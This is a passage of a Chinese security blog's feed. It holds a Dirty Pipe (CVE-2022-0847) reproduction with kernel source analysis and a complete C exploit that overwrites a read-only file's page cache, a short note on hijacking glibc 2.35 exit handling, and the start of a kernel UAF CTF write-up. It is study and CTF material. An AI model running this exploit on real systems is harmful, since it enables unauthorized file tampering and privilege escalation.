into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line"><span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment"> * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment"> * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment"> * be there for the next write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We&#x27;re going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment"> * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment"> * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment"> * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">&#125;</span><br><span class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在上半部分的会验证待输入的内容和当前页内已输入的内容长度是否超过<code>PAGE_SIZE</code>，然后验证<code>buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE</code>如果通过则会进行copy操作。</p><p>如果未通过上半部分的验证则不会进入out，则会进入下方的for循环内，下面会新生成一个page，并且初始化buf</p><p><strong>注意：这里默认的<code>buf-&gt;flag = PIPE_BUF_FLAG_CAN_MERGE</code></strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="linux-内核page-cache机制"><a href="#linux-内核page-cache机制" class="headerlink" title="linux 内核page cache机制"></a>linux 内核page cache机制</h3><p>linux 通过将打开的文件放到缓存页之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。而我们通过该方法篡改了这个文件缓存页，则短时间内访问(读取)该文件的操作都会读到被我们篡改的文件缓存页上，完成利用。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><code>splice</code> 的零拷贝方法就是，直接用文件缓存页来替换<code>pipe</code> 中的缓存页(更改pipe缓存页指针指向文件缓存页)</p><p>这里漏洞出现在:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里在最后是将page直接赋值给了buf，并且未初始化flag。如果我们修改page为目标文件，并且没有修改flag，那么我们可以直接使用pipe_write进行写。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/641.jpeg"                                     ></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先生成管道，并使用write填满所有管道 (下面截图中第一个结构体为<code>pipe_inode_info</code>)</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122202208115.png"                      alt="image-20221122202208115"                ></p><ol start="2"><li>随后read出所有pipe，head和tail相等，清空pipe</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203439231.png"                      alt="image-20221122203439231"                ></p><ol start="3"><li>通过splice修改pipe-&gt;bufs-&gt;page指向文件缓存页</li><li>最后通过pipe_write写入内容</li></ol><h3 id="综上，得出exp"><a href="#综上，得出exp" class="headerlink" title="综上，得出exp"></a>综上，得出exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> data[] = <span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> data_size = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(p))</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        read(p[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] splice failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short splice!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] write failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nbytes == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] short write!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221122203918963.png"                      alt="image-20221122203918963"                ></p><hr><p>总的来说，这个CVE的利用不算是很难，后续我会将复现环境都打包到github上</p><p>参考链接:</p><p><a class="link"   href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg" >https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://dirtypipe.cm4all.com/" >https://dirtypipe.cm4all.com/<i class="fas fa-external-link-alt"></i></a></p><p>打包链接:</p><p><a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。&lt;/p&gt;
&lt;p&gt;这个CV</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="零拷贝" scheme="https://cv196082.gitee.io/tags/%E9%9B%B6%E6%8B%B7%E8%B4%9D/"/>
    
    <category term="pipe" scheme="https://cv196082.gitee.io/tags/pipe/"/>
    
  </entry>
  
  <entry>
    <title>GLIBC 2.35 hook</title>
    <link href="https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/"/>
    <id>https://cv196082.gitee.io/2022/11/04/GLIBC2-35-hook/</id>
    <published>2022-11-04T11:13:08.000Z</published>
    <updated>2022-11-04T11:22:49.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。</p><p>那么如果我们存在一个UAF漏洞但是只能申请size为0x20的chunk时就会显得十分窘迫，如果使用选择使用house of emma或者house of apple之类的攻击手法我们就需要花费大量的chunk来进行利用。</p><p>根据上述情况来说就目前我们已学的知识中可以使用exit_hook进行解决，不过就在今天在微信公众号中刷到一篇文章中提到了一篇文章，通过修改<code>_rtld_global._dl_ns._ns_loaded</code>实现劫持程序执行流。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/loader.png"                      alt="image-loader"                ></p><p>如上图所示，在通过exit函数或者程序正常退出时会调用fini_array中的函数</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221104180544894.png"                      alt="image-20221104180544894"                ></p><p>再从这张图中可以看到fini_array中的函数也正是<a href="https://cv196082.gitee.io/2022/03/07/house-of-banana/">house of banana</a>中提到的<code>_dl_fini</code>函数中调用的，并且可以看到是在</p><p><code>_rtld_global._dl_ns._ns_loaded</code>这个位置取出程序基地址，随后根据右边的偏移确定fini_array的位置，所以我们可以通过修改上述地址的内容到我们期望的位置即可劫持了。</p><hr><p>参考文章：<a class="link"   href="https://www.freebuf.com/articles/system/345968.html" >https://www.freebuf.com/articles/system/345968.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;众所周知在高版本的glibc中取消了free_hook和malloc_hook都被删除掉了。&lt;/p&gt;
&lt;p&gt;那么如果我们存在一个UAF漏洞但</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="堆利用" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="hook" scheme="https://cv196082.gitee.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>practice Ⅱ</title>
    <link href="https://cv196082.gitee.io/2022/10/19/practice2/"/>
    <id>https://cv196082.gitee.io/2022/10/19/practice2/</id>
    <published>2022-10-19T06:35:58.000Z</published>
    <updated>2022-10-19T06:36:00.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kernel-pwn1"><a href="#Kernel-pwn1" class="headerlink" title="Kernel pwn1"></a>Kernel pwn1</h2><p>题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开始一直在往复杂的想去了</p><p><strong>吐槽一下：为什么cpio格式的要用img结尾我挂载了很久挂载不上，知道file一看发现是cpio格式</strong></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">test1_open</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(inode *, file *))_fentry__)(inode, filp);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x20</span>LL);</span><br><span class="line">  length = <span class="number">0x20</span>;</span><br><span class="line">  test1_buffer = v2;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  used = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">test1_release</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( test1_buffer )</span><br><span class="line">    kfree(test1_buffer, filp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的漏洞点出在这个UAF上面（开始我还一直在找堆溢出）。因为没注意到在启动脚本中是没有开启kaslr的所以我在用<code>tty_struct</code>，<code>sk_buff</code>这些东西来泄漏基地址，然后泄漏栈地址完成栈迁移。但是发现这些结构体的文件都无法打开，然后仔细一看启动脚本发现并没有开启地址随机化，所以直接开搞就行。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里只需要<code>seq_operations</code>结构体即可，<a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/">modify_ldt利用</a> 这篇文章中提到过这个结构体的使用，可以去看一下这里就不再赘述了。</p><p>题目比较简单直接放exp了</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" 